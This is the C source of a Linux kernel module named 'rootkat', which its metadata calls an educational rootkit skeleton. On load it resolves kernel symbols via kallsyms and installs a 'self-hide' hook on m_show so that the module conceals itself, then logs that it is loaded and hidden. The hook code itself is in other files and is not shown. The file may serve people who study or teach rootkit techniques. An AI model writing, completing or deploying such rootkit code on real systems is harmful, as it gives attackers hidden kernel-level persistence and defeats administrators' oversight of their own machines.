// SPDX-License-Identifier: MIT
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "kallsyms.h"
#include "resolver.h"

#define ROOTKAT_TAG "rootkat: "

extern int  rootkat_hook_m_show_install(void);
extern void rootkat_hook_m_show_remove(void);

static int __init rootkat_init(void)
{
	int rc;

	pr_info(ROOTKAT_TAG "loading\n");

	rc = rootkat_kallsyms_init();
	if (rc) {
		pr_err(ROOTKAT_TAG "kallsyms init failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_m_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "self-hide hook failed: %d\n", rc);
		return rc;
	}

	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
	return 0;
}

static void __exit rootkat_exit(void)
{
	rootkat_hook_m_show_remove();
	pr_info(ROOTKAT_TAG "unloaded\n");
}

module_init(rootkat_init);
module_exit(rootkat_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkat");
MODULE_DESCRIPTION("Educational LKM rootkit skeleton");
MODULE_VERSION("0.0.1");
